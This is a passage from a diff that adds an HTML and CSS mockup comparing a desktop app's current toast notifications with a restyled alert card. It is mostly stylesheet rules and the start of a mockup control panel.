@@ -1,0 +1,1376 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ADE alerts: today, restyle, follow-ups (mockup, draft 3)</title>
+<style>
+/* ------------------------------------------------------------------
+   Page chrome (the mockup's own controls). Not ADE's look.
+   ------------------------------------------------------------------ */
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; }
+body {
+  background: #050607; color: #d6d9de;
+  font: 13px/1.45 -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+  display: grid; grid-template-columns: 360px minmax(0, 1fr); gap: 16px; padding: 16px;
+}
+@media (max-width: 900px) { body { grid-template-columns: 1fr; height: auto; } }
+.ctl { overflow: auto; padding-right: 4px; display: flex; flex-direction: column; gap: 10px; }
+.ctl h1 { font-size: 15px; font-weight: 600; color: #fff; }
+.ctl p { color: #9aa0aa; font-size: 12px; }
+.ctl fieldset { border: 1px solid #23262c; border-radius: 8px; padding: 8px 10px 10px; display: flex; flex-direction: column; gap: 4px; min-width: 0; }
+.ctl fieldset[hidden] { display: none; }
+.ctl fieldset.fu { border-color: #5b4a1c; }
+.ctl legend { padding: 0 4px; font-size: 11px; font-weight: 600; letter-spacing: .05em; text-transform: uppercase; color: #9aa0aa; }
+.ctl label { display: flex; gap: 6px; align-items: flex-start; font-size: 12px; cursor: pointer; min-height: 24px; padding-top: 3px; }
+.ctl label small, .ctl .note { display: block; color: #8b919b; font-size: 11px; }
+.ctl input[type="radio"], .ctl input[type="checkbox"] { margin-top: 2px; accent-color: #7c8fff; flex-shrink: 0; }
+.ctl .row { display: flex; flex-wrap: wrap; gap: 6px; }
+.ctl .cols { display: grid; grid-template-columns: 1fr 1fr; gap: 0 8px; }
+.ctl button, .ctl select {
+  font: inherit; font-size: 12px; min-height: 28px; padding: 4px 10px; border-radius: 6px; cursor: pointer;
+  background: #16181c; color: #e8eaed; border: 1px solid #30343b; text-align: left;
+}
+.ctl button[hidden] { display: none; }
+.ctl button:hover { border-color: #5a616d; }
+.ctl button kbd { font: 10px ui-monospace, monospace; color: #9aa0aa; margin-left: 6px; }
+.ctl :focus-visible { outline: 2px solid #9db0ff; outline-offset: 2px; }
+.ctl ol#log { list-style: none; font: 11px/1.5 ui-monospace, "SF Mono", monospace; color: #b3b8c1; max-height: 220px; overflow: auto; }
+.ctl ol#log li { padding: 2px 0; border-bottom: 1px solid #16181c; overflow-wrap: anywhere; }
+.ctl ol#log li b { color: #e8eaed; font-weight: 600; }
+.stage { display: flex; flex-direction: column; gap: 8px; min-width: 0; min-height: 0; overflow: auto; }
+.stage__cap { font-size: 12px; color: #9aa0aa; min-height: 54px; }
+.stage__cap b { color: #e8eaed; }
+.stage__covers { font-size: 12px; color: #9aa0aa; min-height: 18px; }
+.stage__covers b { color: #f0c36a; font-weight: 600; }
+.banner { display: none; padding: 6px 10px; border: 1px solid #5b4a1c; border-radius: 6px; background: #1d1808; color: #f0c36a; font-size: 12px; }
+body[data-view="follow"] .banner { display: block; }
+
+/* ------------------------------------------------------------------
+   ADE tokens, copied from src/index.css (:root). Colours are set per
+   preset by JS from src/stores/settingsStore.ts (applyTheme).
+   ------------------------------------------------------------------ */
+.win {
+  --bg-primary: #0A0B0D; --bg-secondary: #0F1013; --bg-tertiary: #15171B; --bg-elevated: #1B1E23; --bg-surface: #262A31;
+  --text-primary: #E8EAED; --text-secondary: #9BA1AC; --text-muted: #5A616D;
+  --accent: #7C8FFF; --accent-subtle: rgba(124,143,255,.15); --accent-hover: rgba(124,143,255,.25); --accent-solid: #4A5FE0;
+  --green: #4CC38A; --green-subtle: rgba(76,195,138,.15);
+  --red: #F4756B; --red-subtle: rgba(244,117,107,.15);
+  --yellow: #D9A441; --yellow-subtle: rgba(217,164,65,.15);
+  --border: rgba(255,255,255,.055); --border-strong: rgba(255,255,255,.10);
+  --control-h: 28px; --control-h-sm: 22px;
+  --radius-sm: 4px; --radius: 6px; --radius-lg: 8px; --radius-xl: 10px;
+  --text-2xs: 10px; --text-xs: 11px; --text-sm: 12px; --text-base: 13px; --text-md: 15px;
+  --tracking-tight: -0.011em; --tracking-micro: 0.06em;
+  --space-0-5: 2px; --space-1: 4px; --space-1-5: 6px; --space-2: 8px; --space-3: 12px; --space-4: 16px;
+  --elev-1: 0 1px 2px rgba(0,0,0,.40);
+  --elev-2: 0 2px 4px rgba(0,0,0,.30), 0 4px 12px rgba(0,0,0,.35);
+  --elev-3: 0 8px 24px rgba(0,0,0,.45), 0 2px 6px rgba(0,0,0,.30);
+  --hairline-top: inset 0 1px 0 rgba(255,255,255,.04);
+  --ease-out: cubic-bezier(0.16, 1, 0.3, 1); --dur-fast: 120ms; --dur-base: 180ms;
+  /* The app bundles Inter and JetBrains Mono; this file loads nothing, so the system fallbacks of the same stacks show. */
+  --font-ui: "Inter Variable", "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
+  --font-mono: "JetBrains Mono Variable", "JetBrains Mono", "SF Mono", ui-monospace, monospace;
+}
+
+/* ------------------------------------------------------------------
+   The stand-in window: the real layout of App.tsx 347-405.
+   TabBar / [content column | Preview panel] / Scratchpad / ShortcutsBar.
+   ------------------------------------------------------------------ */
+.win {
+  position: relative; width: 100%; height: 640px; flex: 0 0 auto; overflow: hidden;
+  border-radius: 10px; border: 1px solid #23262c;
+  background: var(--bg-primary); color: var(--text-primary); font-family: var(--font-ui);
+  -webkit-font-smoothing: antialiased; display: flex; flex-direction: column;
+}
+.win.small { width: 460px; height: 360px; }
+.win.def { width: 1200px; height: 800px; }   /* tauri.conf.json: the default window */
+.win.def .side { width: 480px; }              /* the Preview panel's default width */
+.win :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: var(--radius-sm); } /* index.css :focus-visible */
+.tabbar { height: 44px; flex: 0 0 auto; display: flex; align-items: flex-end; gap: 4px; padding: 0 12px 0 84px; background: var(--bg-secondary); border-bottom: 1px solid var(--border); position: relative; overflow: hidden; }
+.tabbar::before { content: ""; position: absolute; left: 14px; top: 16px; width: 12px; height: 12px; border-radius: 50%; background: var(--bg-surface); box-shadow: 20px 0 0 var(--bg-surface), 40px 0 0 var(--bg-surface); }
+.tab {
+  display: flex; align-items: center; gap: 6px; font: inherit; font-size: 13px; letter-spacing: -0.01em; cursor: pointer;
+  padding: 6px 14px; min-height: 32px; border: 0; border-radius: var(--radius) var(--radius) 0 0;
+  background: transparent; color: var(--text-secondary); max-width: 190px; flex-shrink: 1; min-width: 0;
+}
+.tab > span.nm { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.tab[aria-selected="true"] { background: var(--bg-primary); color: var(--text-primary); font-weight: 500; }
+.tab-attention { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 0 2px color-mix(in srgb, var(--accent) 25%, transparent); flex-shrink: 0; }
+.agent-dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; display: inline-block; }
+.agent-dot[data-state="needsYou"] { background: #f85149; box-shadow: 0 0 0 2px color-mix(in srgb, #f85149 30%, transparent); }
+.mid { flex: 1 1 auto; min-height: 0; display: flex; overflow: hidden; }
+.col { flex: 1; min-width: 320px; overflow: hidden; display: flex; flex-direction: column; position: relative; }
+/* SubTerminalStrip.css */
+.strip { display: flex; align-items: center; height: 30px; padding: 0 12px; background: var(--bg-primary); border-bottom: 1px solid var(--border); gap: 2px; flex-shrink: 0; font-size: var(--text-sm); color: var(--text-secondary); overflow: hidden; }
+.strip span { display: flex; align-items: center; height: 24px; padding: 0 10px; border-radius: var(--radius-sm); white-space: nowrap; flex-shrink: 0; }
+.strip span.on { background: var(--bg-elevated); color: var(--text-primary); font-weight: 500; }
+.strip i { width: 1px; height: 16px; background: var(--border); margin: 0 6px 0 4px; flex-shrink: 0; }
+/* SubTerminalNotice.tsx */
+.notice { display: flex; align-items: center; gap: 8px; height: 28px; padding: 0 12px; flex-shrink: 0; background: var(--yellow-subtle); color: var(--text-primary); font-size: var(--text-sm); border-bottom: 1px solid var(--border); }
+.notice b { color: var(--yellow); font-weight: 700; }
+.notice span { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.notice code { font-family: var(--font-mono); }
+.notice button { font: inherit; font-size: 11px; padding: 1px 6px; flex-shrink: 0; }
+.panes { flex: 1; min-height: 0; display: flex; }
+/* TerminalPane.tsx: 1 px of pane padding plus xterm's own 20px 4px 4px 8px. The stand-in bottom-aligns a full screen; a new or cleared terminal fills from the top (.topfill). */
+.pane { flex: 1; min-width: 0; min-height: 0; position: relative; display: flex; flex-direction: column; justify-content: flex-end; padding: 21px 5px 5px 9px; font-family: var(--font-mono); font-size: 13px; line-height: 1.5; overflow: hidden; }
+.pane + .pane { border-left: 1px solid var(--border-strong); }
+.win.stack .panes { flex-direction: column; }
+.win.stack .pane + .pane { border-left: 0; border-top: 1px solid var(--border-strong); }
+.win.topfill .pane { justify-content: flex-start; }
+.win.topfill .old, .win:not(.topfill) .fresh { display: none; }
+/* TerminalPane.tsx 122-192: the pane header. top 4, left 8, right 8, z-index 10, pointer-events none; the folder path; and, in the active pane only, RecordingControls.tsx (pointer-events auto). */
+.phead { position: absolute; top: 4px; left: 8px; right: 8px; z-index: 10; display: flex; align-items: center; gap: 6px; pointer-events: none; font-family: monospace; }
+.phead .badge { display: none; align-items: center; gap: 4px; padding: 1px 6px; border-radius: 4px; background: var(--bg-secondary); border: 1px solid var(--border); font-size: 9px; font-weight: 600; color: var(--text-muted); flex-shrink: 0; }
+.win.split .phead .badge { display: flex; }
+.phead .cwd { font-size: 10px; color: var(--text-muted); opacity: .7; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1; }
+.phead .rec { display: flex; align-items: center; gap: 4px; padding: 2px 8px; border-radius: 4px; border: 1px solid var(--border); background: var(--bg-secondary); color: var(--text-muted); font: 10px monospace; cursor: pointer; pointer-events: auto; }
+.phead .rec::before { content: ""; width: 6px; height: 6px; border-radius: 50%; background: var(--text-muted); }
+.pane:not(.active) .phead .rec { display: none; }
+.pane .ln { white-space: pre; overflow: hidden; color: var(--text-secondary); flex-shrink: 0; }
+.pane .ln b { color: var(--text-primary); font-weight: 500; }
+.pane .ln i { font-style: normal; color: var(--green); }
+.pane .ln u { text-decoration: none; color: var(--accent); }
+.prompt { margin-top: 8px; border: 1px solid var(--border-strong); border-radius: var(--radius); display: flex; align-items: flex-start; gap: 8px; padding: 6px 10px; flex-shrink: 0; }
+.prompt span { color: var(--text-secondary); }
+#term, #edit { flex: 1; min-height: 40px; resize: none; background: transparent; border: 0; outline: 0; color: var(--text-primary); font: inherit; caret-color: var(--accent); }
+.prompt:focus-within { border-color: var(--accent); }
+.statusline { display: flex; justify-content: space-between; margin-top: 4px; font-size: 12px; color: var(--text-secondary); flex-shrink: 0; white-space: nowrap; overflow: hidden; }
+/* TerminalSearch.tsx: absolute, top 8, right 16, z-index 20, inside the pane */
+.find { position: absolute; top: 8px; right: 16px; z-index: 20; display: flex; align-items: center; gap: 6px; background: var(--bg-secondary); border: 1px solid var(--border-strong); border-radius: 8px; padding: 6px 10px; box-shadow: 0 8px 24px rgba(0,0,0,.4); font-family: var(--font-ui); }
+.find div { width: 200px; height: 24px; background: var(--bg-primary); border: 1px solid var(--border); border-radius: 4px; color: var(--text-muted); font-size: 12px; padding: 3px 8px; }
+.find span { color: var(--text-secondary); font-size: 12px; padding: 2px; }
+/* Editor tab stand-in */
+.editor { flex: 1; min-height: 0; display: flex; font-family: var(--font-mono); font-size: 13px; line-height: 1.5; position: relative; }
+.editor .gut { width: 44px; text-align: right; padding: 10px 10px 0 0; color: var(--text-muted); white-space: pre; flex-shrink: 0; }
+.editor .code { flex: 1; min-width: 0; padding: 10px 0 0; display: flex; flex-direction: column; color: var(--text-secondary); }
+.editor .code pre { font: inherit; white-space: pre; overflow: hidden; flex: 1; }
+.editor .minimap { width: 64px; flex-shrink: 0; border-left: 1px solid var(--border); background: repeating-linear-gradient(to bottom, color-mix(in srgb, var(--text-muted) 40%, transparent) 0 2px, transparent 2px 5px); opacity: .5; }
+/* PreviewPanel: in the row, to the right of the content column */
+.side { width: 320px; min-width: 280px; flex-shrink: 0; background: var(--bg-secondary); border-left: 1px solid var(--border); display: flex; flex-direction: column; }
+.side header { height: 40px; display: flex; align-items: center; gap: 8px; padding: 0 8px 0 12px; border-bottom: 1px solid var(--border); font-size: 13px; font-weight: 600; flex-shrink: 0; }
+.side header span { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.side header button { width: 24px; height: 24px; border: 0; border-radius: 4px; background: transparent; color: var(--text-secondary); font: inherit; cursor: pointer; }
+.side .doc { flex: 1; min-height: 0; padding: 12px; color: var(--text-secondary); font-size: 12px; line-height: 1.6; overflow: hidden; }
+.side .doc h4 { color: var(--text-primary); font-size: 14px; margin-bottom: 6px; }
+/* Scratchpad and ShortcutsBar: below the row */
+.scratch { height: 110px; flex-shrink: 0; background: var(--bg-tertiary); border-top: 1px solid var(--border); padding: 8px 12px; display: flex; gap: 8px; align-items: flex-end; font-size: 12px; color: var(--text-secondary); }
+.scratch div { flex: 1; align-self: stretch; border: 1px solid var(--border); border-radius: var(--radius); padding: 6px 8px; background: var(--bg-primary); }
+.scratch button { font: inherit; font-size: 12px; height: 28px; padding: 0 12px; border-radius: 4px; border: 1px solid var(--border); background: var(--bg-elevated); color: var(--text-primary); }
+.shortcuts { height: 28px; flex-shrink: 0; background: var(--bg-secondary); border-top: 1px solid var(--border); display: flex; align-items: center; gap: 14px; padding: 0 12px; font-size: 11px; color: var(--text-muted); white-space: nowrap; overflow: hidden; }
+[data-piece][hidden], [data-kindview][hidden], [data-ov][hidden] { display: none; }
+/* Stand-ins for the other tab kinds. Only what sits in their corners is drawn, with the real paddings. */
+.kv { flex: 1; min-height: 0; display: flex; flex-direction: column; position: relative; font-size: 12px; color: var(--text-secondary); }
+.kv button { font: inherit; cursor: pointer; }
+.kv-bar { display: flex; align-items: center; flex-shrink: 0; border-bottom: 1px solid var(--border); }
+.kv-body { flex: 1; min-height: 0; overflow: hidden; padding: 10px 14px; outline-offset: -2px; }
+/* BrowserTab.tsx 60-150 */
+.kv.browser .kv-bar { gap: 6px; padding: 6px 10px; background: var(--bg-secondary); }
+.kv.browser .ic { background: none; border: 0; color: var(--text-secondary); padding: 4px 6px; }
+.kv.browser input { flex: 1; min-width: 0; background: var(--bg-primary); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 6px 10px; font: 12px monospace; color: var(--text-primary); outline: none; }
+.kv.browser .go { background: var(--accent); border: 0; color: #fff; padding: 5px 12px; border-radius: var(--radius-sm); font-size: 11px; font-weight: 600; flex-shrink: 0; }
+.kv.browser .kv-body { background: #f6f7f9; color: #30343b; font-family: Georgia, serif; font-size: 14px; line-height: 1.6; }
+/* fleet/FleetTab.tsx 63-140 */
+.kv.fleet .kv-bar { gap: 10px; padding: 8px 14px; }
+.kv.fleet .kv-bar b { font-size: 13px; color: var(--text-primary); }
+.kv.fleet .kv-bar button, .kv.fleet .ranges button { background: none; border: 1px solid var(--border); font-size: 10px; padding: 2px 7px; border-radius: var(--radius-sm); color: var(--text-muted); }
+.kv.fleet .ranges { display: flex; gap: 10px; }
+.kv.fleet .lane { height: 18px; margin: 0 0 8px; border-radius: 3px; background: var(--accent-subtle); }
+.kv.fleet .kv-foot { border-top: 1px solid var(--border); padding: 8px 14px; font-size: 11px; flex-shrink: 0; display: flex; gap: 14px; flex-wrap: wrap; }
+.kv.fleet .kv-foot button { margin-left: auto; background: none; border: 0; color: var(--text-muted); }
+/* OrchestratorTab.tsx 580-790 */
+.kv.orch { flex-direction: row; }
+.kv.orch .chat { flex: 1; min-width: 0; padding: 16px; outline-offset: -2px; }
+.kv.orch .tasks { width: 360px; flex-shrink: 0; display: flex; flex-direction: column; background: var(--bg-secondary); border-left: 1px solid var(--border); }
+.kv.orch .head { padding: 12px 16px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; font-size: 13px; font-weight: 700; color: var(--text-primary); }
+.kv.orch .head button, .kv.orch .task button.go { padding: 4px 12px; border-radius: 6px; border: 0; background: #22c55e; color: #fff; font-size: 11px; font-weight: 700; }
+.kv.orch .list { flex: 1; min-height: 0; overflow: hidden; padding: 8px; }
+.kv.orch .task { padding: 10px 12px; border: 1px solid var(--border); border-radius: 8px; margin-bottom: 6px; background: var(--bg-primary); }
+.kv.orch .task b { display: block; color: var(--text-primary); font-size: 12px; }
+.kv.orch .task div { display: flex; gap: 6px; margin-top: 10px; }
+.kv.orch .foot { padding: 8px 16px; border-top: 1px solid var(--border); font: 10px monospace; color: var(--text-muted); }
+/* ContractsWorkbench.tsx 255-330, index.css .bench-* */
+.kv.bench .kv-bar { gap: 10px; padding: 8px 14px; background: var(--bg-secondary); color: var(--text-primary); font-size: 13px; }
+.kv.bench .root { font: 11px var(--font-mono); color: var(--text-muted); }
+.kv.bench button { background: var(--bg-tertiary); border: 1px solid var(--border); color: var(--text-primary); border-radius: var(--radius-sm); padding: 5px 10px; font-size: 12px; }
+.kv.bench button.pri { background: var(--accent); border-color: var(--accent); color: #fff; font-weight: 600; }
+.kv.bench .tabs { display: inline-flex; gap: 2px; padding: 2px; border: 1px solid var(--border); border-radius: var(--radius-sm); }
+.kv.bench .tabs button { background: none; border: 0; color: var(--text-secondary); padding: 4px 12px; border-radius: 5px; }
+.kv.bench .tabs button[aria-selected="true"] { background: var(--bg-elevated); color: var(--text-primary); }
+.kv.bench .kv-body { padding: 14px 16px 32px; display: grid; gap: 12px; align-content: start; }
+.kv.bench .tools { display: flex; gap: 8px; align-items: center; }
+.kv.bench .tools input { width: 240px; background: var(--bg-primary); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 5px 8px; font: inherit; color: var(--text-primary); outline: none; }
+.kv.bench .suite { border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
+.kv.bench .suite header { display: flex; align-items: center; gap: 10px; padding: 7px 12px; background: var(--bg-secondary); border-bottom: 1px solid var(--border); }
+.kv.bench .row { display: flex; align-items: center; gap: 8px; padding: 5px 12px; border-top: 1px solid var(--border); font: 12px var(--font-mono); color: var(--text-primary); }
+.kv.bench .row button { padding: 3px 8px; font-size: 11px; font-family: var(--font-ui); }
+.kv .grow { flex: 1; }
+/* Overlays. CommandPalette.tsx 292-305 (z-index 2500, 80 px down, 520 px wide, at most 420 px tall); ui.css .ui-overlay (z-index 1000, 10vh down, at most 560 px wide and 80vh tall); index.css .contracts-panel (z-index 900, 8vh down, min(760px, 94vw), at most 80vh). The dialogs are drawn at their tallest. All are earlier in the DOM than the alert slot, so the card is drawn over them, as today's toast is. */
+.ov { position: absolute; inset: 0; display: flex; justify-content: center; align-items: flex-start; background: rgba(0,0,0,.5); font-size: 13px; color: var(--text-secondary); }
+.ov.palette { z-index: 2500; padding-top: 80px; }
+.ov.palette .box { width: 520px; max-height: 420px; background: var(--bg-secondary); border: 1px solid var(--border-strong); border-radius: 12px; overflow: hidden; display: flex; flex-direction: column; }
+.ov.palette .in { padding: 12px 16px; border-bottom: 1px solid var(--border); }
+.ov.palette .in div { background: var(--bg-primary); border: 1px solid var(--border); border-radius: 8px; padding: 10px 14px; font-size: 14px; color: var(--text-muted); }
+.ov.palette .rows { flex: 1; min-height: 0; overflow: hidden; padding: 4px 0; }
+.ov.palette .rows div { padding: 8px 16px; color: var(--text-primary); }
+.ov.dialog { z-index: 1000; }
+.ov.dialog .box { margin-top: calc(var(--winh, 640px) * .10); width: calc(100% - 32px); max-width: 560px; height: calc(var(--winh, 640px) * .80); background: var(--bg-secondary); border: 1px solid var(--border-strong); border-radius: var(--radius-lg); overflow: hidden; display: flex; flex-direction: column; }
+.ov.cpanel { z-index: 900; }
+.ov.cpanel .box { margin-top: calc(var(--winh, 640px) * .08); width: min(760px, 94%); height: calc(var(--winh, 640px) * .80); background: var(--bg-secondary); border: 1px solid var(--border-strong); border-radius: var(--radius-lg); overflow: hidden; display: flex; flex-direction: column; }
+.ov .box header { display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 12px 16px; border-bottom: 1px solid var(--border); color: var(--text-primary); font-weight: 600; flex-shrink: 0; }
+.ov .box header button, .ov .box footer button { font: inherit; font-size: 12px; height: 28px; padding: 0 12px; border-radius: 4px; border: 1px solid var(--border); background: var(--bg-elevated); color: var(--text-primary); }
+.ov .box .body { flex: 1; min-height: 0; padding: 16px; }
+.ov .box footer { display: flex; justify-content: flex-end; padding: 12px 16px; border-top: 1px solid var(--border); flex-shrink: 0; }
+.ov .box footer span { display: flex; gap: 8px; }
+
+/* ------------------------------------------------------------------
+   TODAY. src/components/Toast.tsx, its inline styles as written, plus
+   .contracts-action and @keyframes toast-slide-in from src/index.css.
+   Only difference: `position: fixed` is `absolute` inside the stand-in.
+   ------------------------------------------------------------------ */
+@keyframes toast-slide-in { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+.t-toast {
+  position: absolute; bottom: 60px; right: 20px; z-index: 2500;
+  background-color: var(--bg-elevated); border: 1px solid var(--border-strong); border-radius: var(--radius);
+  padding: 12px 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); animation: toast-slide-in 0.3s ease; max-width: 320px;
+}
+.t-toast__title { font-size: 13px; font-weight: 600; color: var(--text-primary); margin-bottom: 2px; }
+.t-toast__body { font-size: 12px; color: var(--text-secondary); }
+.t-toast__actions { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px; }
+.contracts-action {
+  display: inline-flex; align-items: center; gap: 6px; font-family: inherit; font-size: 12px; padding: 5px 10px; border-radius: var(--radius-sm);
+  background: var(--bg-tertiary); border: 1px solid var(--border); color: var(--text-primary); cursor: pointer;
+}
+.contracts-action:hover:not(:disabled) { border-color: var(--accent); }
+
+/* ------------------------------------------------------------------
+   RESTYLE.
+   .ui-btn rules below are src/components/ui/ui.css lines 3-60, verbatim.
+   ------------------------------------------------------------------ */
+.ui-btn { display: inline-flex; align-items: center; justify-content: center; gap: var(--space-1-5); font-family: var(--font-ui); font-weight: 500; line-height: 1; border: 1px solid transparent; border-radius: var(--radius-sm); cursor: pointer; white-space: nowrap; user-select: none; }
+.ui-btn:disabled { opacity: 0.45; cursor: not-allowed; }
+.ui-btn--md { height: var(--control-h); padding: 0 var(--space-3); font-size: var(--text-sm); }
+.ui-btn--icon { padding: 0; aspect-ratio: 1; min-width: 24px; min-height: 24px; }
+.ui-btn--primary { background: var(--accent-solid); color: white; box-shadow: var(--hairline-top); }
+.ui-btn--primary:hover:not(:disabled) { filter: brightness(1.12); }
+.ui-btn--primary:active:not(:disabled) { filter: brightness(0.94); }
+.ui-btn--secondary { background: var(--bg-elevated); color: var(--text-primary); border-color: var(--border); box-shadow: var(--hairline-top); }
+.ui-btn--secondary:hover:not(:disabled) { background: var(--bg-surface); border-color: var(--border-strong); }
+.ui-btn--secondary:active:not(:disabled) { background: var(--bg-tertiary); }
+.ui-btn--ghost { background: transparent; color: var(--text-secondary); }
+.ui-btn--ghost:hover:not(:disabled) { background: var(--bg-elevated); color: var(--text-primary); }
+.ui-btn--ghost:active:not(:disabled) { background: var(--bg-surface); }
+
+/* New, in the alert's own stylesheet. Derived from the theme, so every preset gets them. Ratios are in the spec (B6). */
+.win {
+  --alert-body: color-mix(in srgb, var(--text-secondary) 60%, var(--text-primary));
+  --alert-edge: color-mix(in srgb, var(--text-primary) 50%, var(--bg-elevated));          /* card outline: 3:1 or more against the terminal and the panels */
+  --alert-control-edge: color-mix(in srgb, var(--text-primary) 60%, var(--bg-elevated));  /* button and name-box outline: 3:1 or more against the card */
+  --alert-red: color-mix(in srgb, var(--red) 60%, var(--text-primary));
+  --alert-yellow: color-mix(in srgb, var(--yellow) 60%, var(--text-primary));
+  --alert-accent: color-mix(in srgb, var(--accent) 60%, var(--text-primary));
+}
+/* The one change to how a shared button looks, scoped to alerts (spec B4): three rules. Off = ui.css as it is. */
+.win[data-edgefix="on"] .alert .ui-btn--primary, .win[data-edgefix="on"] .alert .ui-btn--secondary { border-color: var(--alert-control-edge); }
+.win[data-edgefix="on"] .alert .ui-btn--secondary:hover:not(:disabled) { border-color: var(--text-primary); }
+.win[data-edgefix="on"] .alert .ui-btn--ghost:hover:not(:disabled) { background: var(--bg-surface); }
+
+.slot { position: absolute; z-index: 2500; display: flex; flex-direction: column; gap: 8px; pointer-events: none; }
+.slot > * { pointer-events: auto; }
+.slot[data-place="B"], .slot[data-place="C"] { flex-direction: column-reverse; }
+.alert__name { min-width: 12px; }
+.alert {
+  position: relative; display: grid; grid-template-columns: 16px minmax(0, 1fr) auto; grid-template-rows: auto minmax(0, 1fr) auto auto;
+  column-gap: 10px; align-items: start; overflow: hidden; flex: 0 1 auto; min-height: 44px;
+  padding: 10px 8px 10px 12px; background: var(--bg-elevated); color: var(--text-primary);
+  border: 1px solid var(--alert-edge); border-radius: var(--radius-lg); box-shadow: var(--elev-3), var(--hairline-top);
+  font-family: var(--font-ui); --alert-kind: var(--alert-accent);
+}
+.alert[data-kind="needs"], .alert[data-kind="problem"] { --alert-kind: var(--alert-red); }
+.alert[data-kind="warning"] { --alert-kind: var(--alert-yellow); }
+.alert[data-kind="agent"] { --alert-kind: var(--alert-body); }
+/* The bar: this alert is waiting for you to do something. A shape, in the kind's icon colour. */
+.alert[data-bar]::before { content: ""; position: absolute; left: 0; top: 0; bottom: 0; width: 3px; background: var(--alert-kind); }
+.alert[data-bar] { padding-left: 14px; }
+.alert[data-clickable] { cursor: pointer; }
+.alert__icon { width: 16px; height: 16px; margin-top: 1px; color: var(--alert-kind); grid-column: 1; grid-row: 1; }
+.alert__icon svg { display: block; width: 16px; height: 16px; }
+.alert__title { grid-column: 2; grid-row: 1; font-size: var(--text-base); font-weight: 600; line-height: 18px; letter-spacing: var(--tracking-tight); overflow-wrap: anywhere; min-width: 0; }
+/* A name someone else typed. Boxed so no character in it can pass for ADE's words; isolated so its direction cannot leak. */
+.alert__name {
+  display: inline-block; vertical-align: bottom; max-width: 100%; height: 18px; line-height: 16px; padding: 0 5px; margin: 0 1px;
+  overflow: hidden; text-overflow: ellipsis; white-space: nowrap; unicode-bidi: isolate;
+  border: 1px solid var(--alert-control-edge); border-radius: var(--radius-sm); background: var(--bg-primary);
+  font-family: var(--font-mono); font-size: var(--text-sm); font-weight: 500; letter-spacing: 0; color: var(--text-primary);
+}
+.alert__body { grid-column: 2; grid-row: 2; margin-top: 2px; font-size: var(--text-sm); line-height: 17px; color: var(--alert-body); overflow-wrap: anywhere; min-height: 0; overflow-y: auto; align-self: stretch; }
+.alert__actions { grid-column: 2; grid-row: 3; display: flex; flex-wrap: wrap; align-items: center; gap: 6px; margin-top: 8px; }
+.alert__hint { grid-column: 2; grid-row: 4; margin-top: 6px; font-size: var(--text-xs); line-height: 15px; color: var(--alert-body); }
+.alert__close { grid-column: 3; grid-row: 1; margin-top: -3px; }
+.alert__close svg { width: 12px; height: 12px; }
+.sr-only { position: absolute; width: 1px; height: 1px; overflow: hidden; clip-path: inset(50%); white-space: nowrap; }
+
+/* Motion: 180 ms in, 6 px of travel from the edge it hangs from. Exit is instant, as today. None under reduced motion. */
+@keyframes alert-in-top { from { opacity: 0; transform: translateY(-6px); } to { opacity: 1; transform: none; } }
+@keyframes alert-in-bottom { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+@media (prefers-reduced-motion: no-preference) {
+  .win:not(.rm) .alert { animation: alert-in-top var(--dur-base) var(--ease-out); }
+  .win:not(.rm) .slot[data-place="B"] .alert, .win:not(.rm) .slot[data-place="C"] .alert { animation-name: alert-in-bottom; }
+}
+.win.rm .t-toast { animation: none; }
+@media (prefers-reduced-motion: reduce) { .t-toast { animation: none; } }
+</style>
+</head>
+<body data-view="today">
+
+<aside class="ctl" aria-label="Mockup controls">
+  <h1>ADE alerts, draft 3</h1>
+  <p>Mockup for <code>2026-11-18-alerts-ux.md</code>. Names are placeholders. Click a trigger, or press its key while typing in the stand-in terminal. An alert must never take the cursor.</p>
+
+  <fieldset>
+    <legend>View</legend>
+    <label><input type="radio" name="view" value="today" checked> <span>Today <small>Toast.tsx as shipped</small></span></label>
+    <label><input type="radio" name="view" value="restyle"> <span>Restyle <small>the main proposal: same behaviour, new look. Ships by itself</small></span></label>
+    <label><input type="radio" name="view" value="follow"> <span>Follow-ups <small>optional behaviour changes, each off until you switch it on</small></span></label>
+  </fieldset>
+
+  <fieldset id="fs-place">
+    <legend>Restyle: where the card sits</legend>
+    <label><input type="radio" name="place" value="AB" checked> <span>AB. Top right on terminal tabs, bottom right on other tabs <small>recommended. A where the tab is a terminal, B everywhere else</small></span></label>
+    <label><input type="radio" name="place" value="A"> <span>A. Top right of the tab's content, every tab kind <small>terminal: under the pane header. Other tabs: over their top-right controls</small></span></label>
+    <label><input type="radio" name="place" value="B"> <span>B. Bottom right of the tab's content, every tab kind <small>one place everywhere; over the newest lines of a full terminal</small></span></label>
+    <label><input type="radio" name="place" value="C"> <span>C. Where it is today <small>window corner, 60 px up, 20 px in</small></span></label>
+    <label><input type="checkbox" id="opt-close" checked> <span>Close button on the card <small>a small behaviour change; untick to see the restyle without it</small></span></label>
+    <label><input type="checkbox" id="opt-edge" checked> <span>Visible edge on buttons inside a card <small>untick to see the real <code>ui-btn</code> secondary with no change</small></span></label>
+  </fieldset>
+
+  <fieldset>
+    <legend>Window pieces</legend>
+    <div class="cols">
+      <label><input type="checkbox" data-toggle="side"> <span>Right panel (Preview)</span></label>
+      <label><input type="checkbox" data-toggle="strip"> <span>Sub-terminal strip</span></label>
